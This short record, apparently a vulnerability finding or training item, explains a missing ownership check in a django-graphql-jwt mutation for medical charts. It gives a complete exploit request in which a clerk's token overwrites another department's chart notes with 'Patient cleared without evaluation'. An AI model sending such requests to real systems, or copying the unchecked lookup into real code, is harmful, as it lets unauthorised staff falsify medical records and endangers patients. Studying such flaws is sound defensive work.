diagnosis: The mutation uses django-graphql-jwt to verify authentication, but retrieves PatientMedicalChart directly by chart_id without checking that info.context.user is the assigned clinician or attending physician for that patient. Any authenticated practitioner or clinic clerk can overwrite clinical notes on charts of patients in other departments.
exploit_request:
POST /graphql/ HTTP/1.1
Host: clinic.hospitalgroup.org
Authorization: JWT <authenticated_clerk_token>
Content-Type: application/json

{"query": "mutation { updateMedicalChart(chartId: 9481, notes: \"Patient cleared without evaluation\") { success } }"}
